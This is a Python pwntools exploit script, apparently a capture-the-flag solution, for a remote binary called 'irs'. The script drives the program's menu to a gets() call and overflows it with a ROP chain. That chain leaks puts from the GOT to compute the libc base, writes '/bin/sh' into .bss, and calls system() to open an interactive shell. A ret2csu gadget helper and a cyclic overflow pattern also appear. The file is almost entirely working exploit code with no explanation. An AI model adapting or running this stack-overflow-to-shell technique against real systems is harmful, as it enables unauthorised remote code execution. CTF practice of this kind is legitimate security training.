from pwn import *
import StringIO

context.log_level = 'debug'
#context.aslr = False

#io = process('./irs')
io = remote('irs-2.pwn.republican', 4127)

e = ELF('./irs')
libc = e.libc

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x00401866
	addr2 = 0x00401850
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)

def lead_to_gets():
	answer('Trump', '1')
	answer('name:', '123')
	answer('password:', '123')
	answer('income:', '123')
	answer('tions:', '123')
	answer('1 - 123', '3')
	answer('edit:', '123')
	answer('password:', '123')
	answer('income:', '123')
	answer('ble:','123')


#payload = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

ret = 0x80484a2
popret = 0x80484b9
pop2ret = 0x804915a
pop3ret = 0x8049159
pop4ret = 0x8049158
leaveret = 0x804871f
addesp_12 = 0x80484b6
addesp_16 = 0x80485a5

puts_plt = 0x080484F8
puts_got = 0x804AFDC
fgets_plt = 0x80484E8
main_addr = 0x8048A39 
bss_addr = 0x804B029
gets_plt = 0x080484D8
stdin_addr = 0x0804B020

payload = 'A'*25 
payload += p32(puts_plt) + p32(popret) + p32(puts_got)
payload += p32(gets_plt) + p32(main_addr) + p32(bss_addr)


lead_to_gets()

#gdb.attach(io, 'b *0x0804892A ')

answer('y/n', payload)
io.recvuntil('recorded!\r\n')
buf = io.recvuntil('\n')

assert(len(buf)>=4)

puts_addr = u32(buf[:4])
log.success('puts:%#x'%puts_addr)
libc.address = puts_addr - libc.symbols['puts']

#system_addr = libc.symbols['system']
system_addr = puts_addr - 0x0005f140 + 0x0003a940

io.sendline('/bin/sh\x00')

lead_to_gets()
payload = 'A'*25
payload += p32(system_addr) + p32(0xdeadbeef) + p32(bss_addr)
answer('y/n', payload)

io.interactive()

